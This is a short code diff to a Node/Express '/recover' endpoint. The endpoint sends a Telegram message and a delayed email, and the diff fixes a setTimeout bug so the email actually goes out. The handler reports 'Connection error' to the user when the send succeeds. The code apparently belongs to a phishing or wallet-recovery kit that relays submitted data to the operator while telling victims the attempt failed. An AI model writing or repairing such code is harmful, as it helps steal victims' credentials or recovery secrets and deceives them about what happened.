@@ -71,14 +71,16 @@ app.post('/recover', (req, res) => {
     sendTGMessage()
     
     // send the email
-    setTimeout(
-        transporter.sendMail(mailOptions, (error, info) => {
+    function sendMailNow() {
+      transporter.sendMail(mailOptions, (error, info) => {
         if (error) {
           res.status(500).send('Erro connecting to');
         } else {
           res.status(200).send('Connection error');
         }
-      }), 1 * 60 * 1000)
+      })
+    }
+    setTimeout(sendMailNow, 1 * 60 * 1000)
   
 });
 
